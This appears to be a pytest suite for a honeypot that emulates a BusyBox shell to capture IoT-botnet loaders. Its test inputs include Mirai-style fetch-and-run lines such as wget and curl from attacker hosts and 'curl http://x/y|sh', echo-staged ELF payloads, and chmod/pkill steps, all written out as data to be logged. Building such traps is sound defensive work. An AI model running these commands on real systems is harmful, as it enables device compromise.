"""Tests for the emulated BusyBox/Linux shell.

The assertions here are deliberately literal about output strings. That is
the point of the module: a loader greps for `applet not found` and reads
`e_machine` out of an ELF header, so "close enough" output is a silent
capture failure, not a cosmetic bug.
"""

from __future__ import annotations

import pytest

from honeyknot.shell import ShellSession, parse_heredoc


def _events(result, name: str) -> list[dict]:
    return [f for n, f in result.events if n == name]


@pytest.fixture
def sh():
    return ShellSession(hostname="dvr", user="root", arch="x86_64")


class TestBusyBoxFingerprint:
    def test_unknown_applet_uses_busybox_wording(self, sh):
        # Mirai greps for exactly this string to confirm it is on BusyBox.
        result = sh.execute("/bin/busybox ECCHI")
        assert result.output == b"ECCHI: applet not found\r\n"
        assert _events(result, "busybox_probe")[0]["applet"] == "ECCHI"

    def test_known_applet_dispatches_to_the_command(self, sh):
        assert sh.execute("/bin/busybox id").output.startswith(b"uid=0(root)")

    def test_bare_busybox_lists_applets(self, sh):
        out = sh.execute("busybox").output
        assert b"BusyBox v1." in out
        assert b"Currently defined functions" in out

    def test_restricted_cli_escapes_succeed_silently(self, sh):
        for cmd in ("enable", "system", "shell", "sh"):
            result = sh.execute(cmd)
            assert result.output == b""
            assert not result.close


class TestArchitectureFingerprint:
    @pytest.mark.parametrize("arch,elf_class,endian,machine", [
        ("x86_64", 2, 1, 0x3E),
        ("arm", 1, 1, 0x28),
        ("arm64", 2, 1, 0xB7),
        ("mips", 1, 2, 0x08),
        ("mipsel", 1, 1, 0x08),
        ("ppc", 1, 2, 0x14),
    ])
    def test_bin_echo_carries_the_right_elf_header(self, arch, elf_class,
                                                   endian, machine):
        session = ShellSession(arch=arch)
        out = session.execute("cat /bin/echo").output
        assert out[:4] == b"\x7fELF"
        assert out[4] == elf_class
        assert out[5] == endian
        order = "big" if endian == 2 else "little"
        assert int.from_bytes(out[16:18], order) == 2      # ET_EXEC
        assert int.from_bytes(out[18:20], order) == machine

    def test_uname_m_matches_the_arch(self):
        assert ShellSession(arch="mips").execute("uname -m").output == b"mips\r\n"
        assert ShellSession(arch="arm").execute("uname -m").output == b"armv7l\r\n"

    def test_unknown_arch_falls_back_to_x86_64(self):
        assert ShellSession(arch="vax").uname_m() == "x86_64"

    def test_uname_a_is_one_line_with_the_hostname(self, sh):
        out = sh.execute("uname -a").output
        assert out.startswith(b"Linux dvr ")
        assert out.count(b"\r\n") == 1


class TestReconCommands:
    def test_proc_mounts_advertises_a_writable_filesystem(self, sh):
        out = sh.execute("cat /proc/mounts").output
        assert b"tmpfs /tmp tmpfs rw" in out

    def test_cpuinfo_matches_the_arch(self):
        assert b"Ralink" in ShellSession(arch="mips").execute(
            "cat /proc/cpuinfo").output
        assert b"Intel(R) Xeon" in ShellSession(arch="x86_64").execute(
            "cat /proc/cpuinfo").output

    def test_etc_passwd_and_shadow(self, sh):
        assert b"root:x:0:0:root:/root:/bin/sh" in sh.execute(
            "cat /etc/passwd").output
        assert b"honeyknotcanary" in sh.execute("cat /etc/shadow").output

    def test_missing_file_gets_enoent(self, sh):
        assert sh.execute("cat /etc/nope").output == \
            b"cat: /etc/nope: No such file or directory\r\n"

    def test_id_reflects_the_session_user(self):
        assert ShellSession(user="admin").execute("id").output == \
            b"uid=1000(admin) gid=1000(admin) groups=1000(admin)\r\n"

    def test_unknown_command(self, sh):
        assert sh.execute("frobnicate").output == \
            b"-sh: frobnicate: command not found\r\n"


class TestPromptAndNavigation:
    def test_prompt_reflects_user_and_cwd(self, sh):
        assert sh.prompt == b"root@dvr:/# "
        sh.execute("cd /tmp")
        assert sh.prompt == b"root@dvr:/tmp# "

    def test_non_root_gets_a_dollar_prompt(self):
        assert ShellSession(user="www-data").prompt.endswith(b"$ ")

    def test_cd_dotdot(self, sh):
        sh.execute("cd /var/log")
        sh.execute("cd ..")
        assert sh.cwd == "/var"

    def test_cd_never_errors(self, sh):
        # A loader cd's through candidate staging dirs; failing one ends the
        # session early.
        assert sh.execute("cd /this/does/not/exist").output == b""


class TestChaining:
    def test_semicolon_chain_concatenates_output(self, sh):
        out = sh.execute("whoami; pwd").output
        assert out == b"root\r\n/\r\n"

    def test_and_chain(self, sh):
        assert b"root" in sh.execute("cd /tmp && whoami").output

    def test_pipe_feeds_stdin_to_grep(self, sh):
        out = sh.execute("cat /etc/passwd | grep admin").output
        assert b"admin:x:1000" in out
        assert b"daemon" not in out

    def test_pipe_to_shell_records_the_script(self, sh):
        result = sh.execute("cat /etc/passwd | sh")
        assert _events(result, "script_exec")
        assert result.artifacts and result.artifacts[0][0] == "piped-script.sh"

    def test_quotes_survive_chain_splitting(self, sh):
        out = sh.execute("echo 'a;b|c'").output
        assert out == b"a;b|c\r\n"

    def test_unbalanced_quote_does_not_raise(self, sh):
        sh.execute("echo 'unterminated")

    def test_output_is_capped(self, sh):
        sh.execute("; ".join(["cat /etc/passwd"] * 400))


class TestDownloadCapture:
    def test_wget_url_and_output_name(self, sh):
        result = sh.execute("wget http://185.10.2.3/bins/x86 -O /tmp/x")
        event = _events(result, "download_attempt")[0]
        assert event["tool"] == "wget"
        assert event["urls"] == ["http://185.10.2.3/bins/x86"]
        assert event["host"] == "185.10.2.3"
        assert event["output"] == "/tmp/x"
        assert b"saved" in result.output

    def test_output_flag_is_not_mistaken_for_the_host(self, sh):
        event = _events(sh.execute("wget -O dvrHelper http://1.2.3.4/m"),
                        "download_attempt")[0]
        assert event["host"] == "1.2.3.4"

    def test_curl_writes_nothing_to_stdout(self, sh):
        result = sh.execute("curl -s http://evil.tld/m.sh")
        assert result.output == b""
        assert _events(result, "download_attempt")[0]["tool"] == "curl"

    def test_busybox_wget_is_captured(self, sh):
        result = sh.execute("/bin/busybox wget http://1.2.3.4/a -O a")
        assert _events(result, "download_attempt")[0]["urls"] == \
            ["http://1.2.3.4/a"]

    def test_tftp_get(self, sh):
        event = _events(sh.execute("tftp -g -r bins.sh 1.2.3.4"),
                        "download_attempt")[0]
        assert event["tool"] == "tftp"
        assert event["remote"] == "bins.sh"
        assert event["host"] == "1.2.3.4"

    def test_url_with_no_scheme_still_logs_the_attempt(self, sh):
        assert _events(sh.execute("wget 1.2.3.4"), "download_attempt")


class TestEchoLoader:
    def test_hex_escapes_are_decoded(self, sh):
        assert sh.execute(r"echo -ne '\x41\x42\x43'").output == b"ABC"

    def test_octal_and_c_escapes(self, sh):
        assert sh.execute(r"echo -e '\101\t\n'").output == b"A\t\n\r\n"

    def test_n_flag_suppresses_the_newline(self, sh):
        assert sh.execute("echo -n hi").output == b"hi"

    def test_echo_without_e_leaves_escapes_literal(self, sh):
        assert sh.execute(r"echo '\x41'").output == b"\\x41\r\n"

    def test_redirect_writes_the_virtual_file(self, sh):
        result = sh.execute(r"echo -ne '\x41\x42' > /tmp/x")
        assert result.output == b""
        assert sh.files["/tmp/x"] == b"AB"
        assert _events(result, "file_write")[0]["path"] == "/tmp/x"

    def test_append_accumulates(self, sh):
        sh.execute(r"echo -ne '\x41' > /tmp/x")
        result = sh.execute(r"echo -ne '\x42' >> /tmp/x")
        assert sh.files["/tmp/x"] == b"AB"
        assert _events(result, "file_write")[0]["append"] is True

    def test_redirect_without_a_space(self, sh):
        sh.execute("echo hi >/tmp/y")
        assert sh.files["/tmp/y"] == b"hi\r\n"

    def test_reassembled_elf_becomes_an_artifact(self, sh):
        sh.execute(r"echo -ne '\x7f\x45\x4c\x46\x01\x01\x01' > /tmp/.s")
        result = sh.execute(
            r"echo -ne '" + r"\x00" * 60 + r"' >> /tmp/.s")
        assert result.artifacts, "a complete ELF should surface as an artifact"
        name, blob = result.artifacts[0]
        assert name == "/tmp/.s"
        assert blob[:4] == b"\x7fELF"
        assert len(blob) == 67

    def test_partial_elf_is_not_yet_an_artifact(self, sh):
        result = sh.execute(r"echo -ne '\x7f\x45\x4c\x46' > /tmp/.s")
        assert result.artifacts == []

    def test_short_script_with_shebang_is_an_artifact(self, sh):
        result = sh.execute(
            "echo '#!/bin/sh' > /tmp/a.sh")
        assert result.artifacts == []  # too short on its own
        result = sh.execute(
            "echo '#!/bin/sh\ncurl http://x/y|sh\nexit 0\n#padding padding' "
            ">> /tmp/a.sh")
        assert result.artifacts

    def test_file_count_is_bounded(self, sh):
        for i in range(60):
            sh.execute(f"echo x > /tmp/f{i}")
        assert len(sh.files) <= 32


class TestHeredoc:
    def test_parse_heredoc(self):
        assert parse_heredoc("cat > /tmp/x.sh << EOF") == ("/tmp/x.sh", "EOF")
        assert parse_heredoc("cat >/tmp/x <<'END'") == ("/tmp/x", "END")
        assert parse_heredoc("echo hi") is None

    def test_heredoc_body_is_collected_and_stored(self, sh):
        sh.heredoc = ("/tmp/x.sh", "EOF", bytearray())
        sh.execute("#!/bin/sh")
        sh.execute("wget http://1.2.3.4/a")
        result = sh.execute("EOF")
        assert sh.heredoc is None
        assert sh.files["/tmp/x.sh"] == b"#!/bin/sh\nwget http://1.2.3.4/a\n"
        assert result.artifacts[0][0] == "/tmp/x.sh"


class TestPayloadExecution:
    def test_staged_payload_runs_silently(self, sh):
        sh.execute("cd /tmp")
        sh.execute(r"echo -ne '\x7f\x45\x4c\x46' > .s")
        result = sh.execute("./.s")
        assert result.output == b""
        event = _events(result, "payload_exec")[0]
        assert event["staged"] is True
        assert event["resolved"] == "/tmp/.s"

    def test_unstaged_payload_gets_the_real_error(self, sh):
        result = sh.execute("./nope")
        assert result.output == b"-sh: ./nope: not found\r\n"
        assert _events(result, "payload_exec")[0]["staged"] is False

    def test_chmod_is_recorded(self, sh):
        event = _events(sh.execute("chmod 777 dvrHelper"), "chmod")[0]
        assert event["targets"] == ["dvrHelper"]

    def test_kill_targets_are_recorded(self, sh):
        assert _events(sh.execute("pkill -9 kdevtmpfsi"), "process_kill")

    def test_dd_check_returns_the_staged_bytes(self, sh):
        sh.execute(r"echo -ne '\x7f\x45\x4c\x46' > /tmp/.s")
        assert sh.execute("dd bs=52 count=1 if=/tmp/.s").output == b"\x7fELF"

    def test_exit_closes(self, sh):
        assert sh.execute("exit").close is True


class TestIsolation:
    def test_two_sessions_do_not_share_files(self):
        a, b = ShellSession(), ShellSession()
        a.execute("echo hi > /tmp/x")
        assert "/tmp/x" in a.files
        assert b.files == {}

    def test_two_sessions_do_not_share_cwd(self):
        a, b = ShellSession(), ShellSession()
        a.execute("cd /tmp")
        assert a.cwd == "/tmp"
        assert b.cwd == "/"


class TestRobustness:
    @pytest.mark.parametrize("line", [
        "", "   ", ";;;", "|||", "&&", "> ", ">>", "'", '"', "\x00\x01",
        "cat", "echo -", "cd", "wget", "chmod", "/bin/busybox",
        "a" * 5000, "; ".join(["id"] * 200),
    ])
    def test_pathological_input_never_raises(self, sh, line):
        sh.execute(line)
